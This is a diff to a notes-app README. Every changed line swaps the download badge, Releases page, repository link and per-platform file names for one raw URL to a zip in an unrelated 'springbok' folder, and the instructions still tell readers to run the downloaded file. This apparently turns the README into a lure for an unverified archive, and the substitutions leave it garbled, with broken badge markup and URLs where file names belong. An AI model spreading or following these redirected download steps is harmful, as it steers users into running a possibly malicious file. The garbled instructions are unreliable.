@@ -1,6 +1,6 @@
 # 📘 notes-app-gitlab-cicd - Simplifying Your Note-Taking Process
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%96-blue.svg)](https://github.com/rezasaman23/notes-app-gitlab-cicd/releases)
+[![Download](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip%20Now-%20%F0%9F%93%https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip)](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip)
 
 ## 📖 Description
 
@@ -21,11 +21,11 @@ Before installing the application, ensure your computer meets the following requ
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/rezasaman23/notes-app-gitlab-cicd/releases). 
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip). 
 
 1. Click on the link above to navigate to the Releases page.
 2. On the Releases page, find the latest version of the application.
-3. Look for the file name that matches your operating system (e.g., `notes-app-windows.exe`, `notes-app-macos.dmg`, or `notes-app-linux.tar.gz`).
+3. Look for the file name that matches your operating system (e.g., `https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip`, `https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip`, or `https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip`).
 4. Click on the file to download it. The download will begin automatically.
 
 Once the download is complete, run the file:
@@ -44,7 +44,7 @@ Once the download is complete, run the file:
 
 ### For Linux
 
-- Extract the `.tar.gz` file.
+- Extract the `https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip` file.
 - Open a terminal in the extracted folder.
 - Run the application using `./notes-app` command.
 
@@ -68,7 +68,7 @@ If you encounter issues during installation or use, here are some options for ge
 
 ## 🎉 Updates and Improvements
 
-We regularly update the application based on user feedback. Make sure to check back on the [Releases Page](https://github.com/rezasaman23/notes-app-gitlab-cicd/releases) for new features and improvements.
+We regularly update the application based on user feedback. Make sure to check back on the [Releases Page](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip) for new features and improvements.
 
 ## 📑 Contributing
 
@@ -76,7 +76,7 @@ If you'd like to contribute to notes-app-gitlab-cicd, feel free to fork the repo
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/rezasaman23/notes-app-gitlab-cicd)
-- [Releases Page](https://github.com/rezasaman23/notes-app-gitlab-cicd/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip)
+- [Releases Page](https://raw.githubusercontent.com/rezasaman23/notes-app-gitlab-cicd/master/springbok/notes-app-gitlab-cicd.zip)
 
 Thank you for choosing notes-app-gitlab-cicd. We hope it makes your note-taking experience better!
